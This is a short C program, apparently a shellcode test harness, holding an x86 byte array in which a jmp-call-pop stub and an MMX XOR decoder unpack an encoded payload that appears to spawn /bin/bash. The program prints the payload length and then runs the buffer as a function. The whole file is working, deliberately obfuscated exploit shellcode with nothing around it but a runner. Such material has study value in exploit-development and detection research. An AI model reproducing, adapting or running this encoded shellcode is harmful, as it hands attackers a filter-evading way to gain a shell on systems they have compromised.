#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1b\x5e\x8d\x7e\x08\x31\xc9\xb1\x07\x0f\x6f\x06\x0f\x6f\x0f\x0f\xef\xc1\x0f\x7f\x07\x83\xc7\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x41\xb2\xf4\x9b\x6a\x22\xec\xa3\x23\xdc\xa0\x23\xec\xa4\x23\x59\x27\xe4\xa0\x27\xfc\xa4\x1a\xa1\x67\x2a\x42\x49\x55\x55\x55\x85\xc8\xc3\xc4\x85\xc8\xcb\xd9\xc2\xf2\xf3\xf3\xf3\xf3\xe9\xe9\xe9\xe9";
main()
{

        printf("Shellcode Length:  %d\n", (int)strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
